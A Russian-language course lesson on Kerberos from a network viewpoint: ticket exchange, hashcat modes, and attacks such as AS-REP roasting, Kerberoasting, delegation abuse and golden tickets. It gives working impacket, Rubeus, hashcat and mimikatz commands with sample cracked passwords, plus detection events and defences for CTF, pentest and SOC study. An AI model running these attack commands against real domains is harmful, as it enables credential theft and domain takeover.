---
id: network-kerberos
title: "Kerberos с сетевой точки зрения: обмен билетов и атаки на провод"
category: network
parent: network-protocol-reversing
difficulty: hard
order: 2
tags: [network, kerberos, tickets, kerberoast, asrep, spn]
prerequisites: [network-protocol-reversing, network-service-enum]
useful_for:
  - "CTF Network/AD (Kerberos-задачи)"
  - "Пентест: атаки на домен"
  - "Работа (SOC): детект Kerberos-аномалий"
estimated_minutes: 55
summary: "Как Kerberos выдаёт билеты (AS/TGS), что видно в трафике, и какие атаки работают на сетевом уровне: AS-REP roasting, Kerberoasting, релей."
---
Kerberos — протокол аутентификации в Active Directory. Он выдаёт **билеты**, зашифрованные ключами, и именно это свойство порождает оффлайн-атаки: перехваченный билет можно брутить словарём на своей машине, не трогая домен. Сетевая точка зрения важна потому, что весь обмен идёт открытым текстом по порту 88, а значит виден в любом зеркале трафика. Урок опирается на [`network-protocol-reversing`](network-protocol-reversing) и [`network-service-enum`](network-service-enum).

## Обмен билетов

Kerberos-инфраструктуру обслуживает **KDC** (Key Distribution Center), который совмещает две службы: **AS** (Authentication Server) и **TGS** (Ticket Granting Server). KDC слушает **88/TCP и 88/UDP**; обычно это контроллер домена. Обмен состоит из трёх фаз:

1. **AS-REQ / AS-REP**: клиент аутентифицируется на KDC и получает **TGT** (ticket-granting ticket). Часть AS-REP зашифрована ключом от пароля пользователя (в этом и слабость). Запрос содержит pre-authentication: клиент шифрует метку времени своим ключом (`PA-ENC-TIMESTAMP`), доказывая знание пароля.
2. **TGS-REQ / TGS-REP**: с TGT клиент просит **сервисный билет (ST)** для конкретного SPN. ST зашифрован ключом сервисной учётки.
3. **AP-REQ**: клиент предъявляет ST сервису вместе с **authenticator** (зашифрованная метка времени), чтобы доказать, что он и есть владелец билета.

**Realm** — домен в верхнем регистре (`CORP.LOCAL`). **Принципал** — учётка вида `user@REALM` или `svc/host.corp.local`. **SPN** (Service Principal Name) — уникальное имя сервиса (`MSSQLSvc/db.corp.local:1433`, `HTTP/web.corp.local`), именно по нему KDC находит сервисную учётку.

```bash
# Наблюдение в трафике: типы сообщений и имена принципалов
tshark -r ad.pcap -Y 'kerberos' -T fields -e kerberos.msg_type -e kerberos.CNameString | head
# 10 = AS-REQ, 11 = AS-REP, 12 = TGS-REQ, 13 = TGS-REP, 14 = AP-REQ
```

## Структура билета и поля на проводе

Билет (Ticket) состоит из открытой части и зашифрованной `enc-part`. Открытая часть содержит номер версии, realm, имя сервиса (SPN) и флаги. Зашифрованная часть для **TGT** шифруется ключом учётки **`krbtgt`**, для **ST** — ключом сервиса. Внутри лежит session key и PAC (Privilege Attribute Certificate) с группами и SID пользователя.

Типы шифрования (`etype`) критичны для оффлайн-перебора:

| Etype | Значение | hashcat mode (AS-REP) | hashcat mode (TGS) |
|-------|----------|------------------------|---------------------|
| 0x17 (23) | RC4-HMAC | 18200 | 13100 |
| 0x12 (18) | AES256-CTS | 19800/19900 | 19600/19700 |
| 0x11 (17) | AES128-CTS | — | — |
| 0x03 | DES (устарел) | — | — |

RC4 (etype 23) брутится в разы быстрее AES: короткие/слабые пароли ломаются минутами. Поле `kerberos.Cipher` в Wireshark содержит зашифрованный блоб — его и передают в hashcat.

## Атаки

- **AS-REP roasting** — у пользователя отключена **pre-authentication**; KDC отдаёт AS-REP, зашифрованный ключом от пароля, без доказательства знания пароля → оффлайн-перебор. Достаточно списка логинов, пароль не нужен.
- **Kerberoasting** — любая доменная учётка запрашивает TGS для SPN; ST зашифрован ключом сервиса → оффлайн-перебор. Требуется лишь валидная учётка (даже обычный пользователь).
- **Golden/Silver ticket** — подделка TGT/ST при наличии ключа `krbtgt`/сервиса.
- **Kerberos relay** — пересылка аутентификации (аналог NTLM relay, но для Kerberos; требует снятия SPN).
- **Unconstrained delegation** — захват TGT всех пользователей, обращающихся к сервису.
- **Kerberoasting без pre-auth** (`AS-REP`) и **password spraying** — перебор одного пароля по многим учёткам (риск блокировки!).

## Инструменты и команды

```bash
# AS-REP roasting (нет pre-auth): из impacket
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
python3 GetNPUsers.py corp.local/jdoe -no-pass -request -dc-ip 10.0.0.10

# Kerberoasting
GetUserSPNs.py corp.local/jdoe:Passw0rd -request -outputfile tgs.txt -dc-ip 10.0.0.10
# Windows: Rubeus
Rubeus.exe kerberoast /outfile:spns.txt /format:hashcat /nowrap
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Энумерация пользователей (без пароля) — kerbrute
kerbrute userenum --dc 10.0.0.10 -d corp.local users.txt

# Оффлайн-перебор
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt        # AS-REP RC4
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt          # Kerberoast RC4
hashcat -m 19700 tgs.txt rockyou.txt --force                       # AES256 TGS (медленнее)

# Сбор из трафика
tshark -r ad.pcap -Y 'kerberos.Cipher' -T fields -e kerberos.Cipher
```

## Разобранный пример: Kerberoasting за 3 шага

```bash
# 1. Есть любая доменная учётка
# 2. Запрашиваем сервисные билеты для всех SPN
GetUserSPNs.py corp.local/jdoe:Password123 -request -outputfile tgs.txt
# Вывод:
# ServicePrincipalName        Name       MemberOf   PasswordLastSet
# --------------------------  ---------  ---------  -------------------
# MSSQLSvc/db.corp.local:1433 svc_sql              2023-04-01 10:22:00
# $krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db.corp.local:1433*$ab12...
# 3. Оффлайн-перебор
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
# $krb5tgs$23$*svc_sql...:Summer2023!
# Status...........: Cracked
```

Получен пароль сервисной учётки `svc_sql` — далее её права определяют, насколько глубоко можно уйти (часто это локальный админ на SQL-сервере).

## AS-REP roasting пошагово

```bash
# 1. Находим пользователей без pre-auth (LDAP-фильтр)
ldapsearch -x -H ldap://10.0.0.10 -D 'corp\jdoe' -w 'Passw0rd' \
  -b 'dc=corp,dc=local' '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName
# 2. Запрашиваем AS-REP без пароля
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
# 3. Перебор (RC4 → mode 18200)
hashcat -m 18200 asrep.txt rockyou.txt
# $krb5asrep$23$svc_backup@CORP.LOCAL:...:Backup2022!
```

Флаг `4194304` (0x400000) в `userAccountControl` = `DONT_REQUIRE_PREAUTH`.

## Делегирование и его абуз

**Делегирование** позволяет сервису действовать от имени пользователя при обращении к другому сервису. Это удобно, но опасно:

- **Unconstrained delegation** — сервис получает **полный TGT** пользователя и может сохранить его в памяти (LSASS). Компрометация такого хоста = захват TGT всех, кто к нему обращается. Абуз: коэрсия (`PetitPotam`/`PrinterBug`) заставляет DC аутентифицироваться к нам, затем `Rubeus monitor`/`tgtdeleg` извлекает TGT.
- **Constrained delegation** — сервис может действовать только к заданным SPN; абуз через `S4U2Self`/`S4U2Proxy` при знании ключа сервиса.
- **Resource-based constrained delegation (RBCD)** — цель сама решает, кому доверять; абуз при праве записи в атрибут `msDS-AllowedToActOnBehalfOfOtherIdentity`.

```bash
# Поиск unconstrained-delegation хостов (флаг TRUSTED_FOR_DELEGATION = 524288)
ldapsearch -x -H ldap://dc -b "dc=corp,dc=local" \
  "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName
# Коэрсия + relay/monitor (в лаборатории): PetitPotam -> Rubeus monitor -> TGT
```

## Golden и Silver ticket

- **Golden ticket** — подделка TGT при наличии ключа `krbtgt`. Даёт произвольный доступ в домене (пока ключ не сменён дважды). `mimikatz` `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt`.
- **Silver ticket** — подделка **сервисного** билета (ST) при наличии ключа сервисной учётки; обращается только к этому сервису (тише Golden, не требует касания KDC).
- **Sapphire ticket** — гибрид, обходит некоторые детекты.

Признаки в трафике: TGT с аномальным сроком жизни (10 лет), отсутствие соответствующего `4768` (AS-REQ) для выданного билета, странные `group`-SID.

## Детект и защита

- Мониторинг **4769** (TGS) с шифром **RC4** и большим числом запросов — Kerberoasting.
- **4768** без pre-auth — AS-REP roasting (событие `4768` с `PreAuthType=0`).
- Аномальные TGT (срок, SID истории) — Golden ticket.
- **Защита**: длинные пароли сервисов/gMSA, AES, pre-auth для всех, tiered admin, `Protected Users`, LAPS, отключение unconstrained delegation, мониторинг коэрсии.
- **Сетевой детект**: скачки числа TGS-REQ с одного IP, запросы к редким SPN, RC4 там, где домен на AES.

## Практика: с чего начать в домене

```bash
# 1. Найти DC (порт 88/389/445 на одном хосте)
nmap -p88,389,445,636 10.0.0.0/24 --open
# 2. Собрать пользователей (см. network-service-enum, kerbrute)
# 3. Проверить AS-REP roasting без кредов
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -format hashcat
# 4. С любой валидной учёткой — Kerberoasting
GetUserSPNs.py corp.local/user:pass -request
# 5. Пароли — оффлайн
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 tgs.txt rockyou.txt
```

## Ключевые события Windows

| Event ID | Значение |
|----------|----------|
| 4768 | TGT запрошен (AS-REQ) |
| 4769 | Сервисный билет запрошен (TGS) |
| 4770 | Билет обновлён |
| 4771 | Ошибка пред-аутентификации |
| 4624 | Успешный вход (LogonType 3 = сеть) |

Аномалии: 4769 с RC4 (0x17) в большом объёме — Kerberoasting; 4768 без пред-аутентификации — AS-REP roasting.

## Что дальше / решение

Порядок действий в лаборатории и на реальном engagement:

1. **Найти KDC** (`nmap -p88,389,445`) и определить realm.
2. **Собрать список логинов** (kerbrute userenum, LDAP-энумерация) — без пароля.
3. **Проверить AS-REP roasting** (`GetNPUsers.py -no-pass`) — не требует кредов.
4. **Получив любую учётку** — сделать Kerberoasting (`GetUserSPNs.py -request`).
5. **Сбрутить билеты** оффлайн (`hashcat -m 18200/13100`).
6. **Определить права** найденных учёток (`netexec smb -u svc_sql -p ... --shares`).
7. **Углубиться**: делегирование, ADCS, RBCD — см. [`network-ntlm-relay`](network-ntlm-relay) и AD-модуль.

Решение-эвристика: если есть домен и хотя бы один пользователь — пробуйте Kerberoasting; если нет вообще ничего — AS-REP roasting по списку логинов. Оба метода дают хэши для оффлайн-работы и не «светят» пароли в сети.

## Резюме

Kerberos безопасен по дизайну, но выдача билетов, зашифрованных ключами от паролей, делает оффлайн-перебор возможным. Защита: длинные пароли/gMSA, pre-auth, AES, ограничение делегирования, мониторинг 4768/4769. На проводе всё видно по порту 88 — умейте читать `kerberos.Cipher` и типы сообщений.

## Квиз

```quiz
- question: "Что клиент получает в AS-REP?"
  options:
    - "TGT (ticket-granting ticket)"
    - "Сервисный билет"
    - "Пароль"
    - "Сертификат"
  answer: 0
  explanation: "AS-REP содержит TGT, зашифрованный ключом krbtgt (и часть — ключом пользователя)."
- question: "Почему возможен AS-REP roasting?"
  options:
    - "У пользователя отключена pre-authentication, и KDC отдаёт AS-REP, зашифрованный ключом от пароля"
    - "KDC не шифрует"
    - "Kerberos использует NTLM"
    - "Билеты не подписаны"
  answer: 0
  explanation: "Без pre-auth ответ можно перехватить и брутить оффлайн."
- question: "Что нужно для Kerberoasting?"
  options:
    - "Любая доменная учётка и наличие SPN"
    - "Права администратора домена"
    - "Физический доступ"
    - "Сертификат ADCS"
  answer: 0
  explanation: "TGS можно запросить под любой доменной учёткой; тикет шифруется ключом сервиса."
- question: "На каком порту работает KDC?"
  options:
    - "88 (TCP/UDP)"
    - "389"
    - "445"
    - "3389"
  answer: 0
  explanation: "Kerberos KDC слушает 88/TCP и UDP."
- question: "Какая защита делает Kerberoasting бесполезным?"
  options:
    - "gMSA с автоматической ротацией длинных паролей"
    - "Отключение LDAP"
    - "Включение IPv6"
    - "SMB signing"
  answer: 0
  explanation: "Случайные длинные пароли gMSA не поддаются оффлайн-перебору."
```

## Где пригодится

- **CTF:** AD-задачи с Kerberos.
- **Пентест:** атаки на домен (Kerberoast/AS-REP).
- **SOC:** детект аномальных Kerberos-запросов.
- **Red team:** движение к Domain Admin.
- **Работа:** укрепление AD (gMSA, pre-auth, AES).
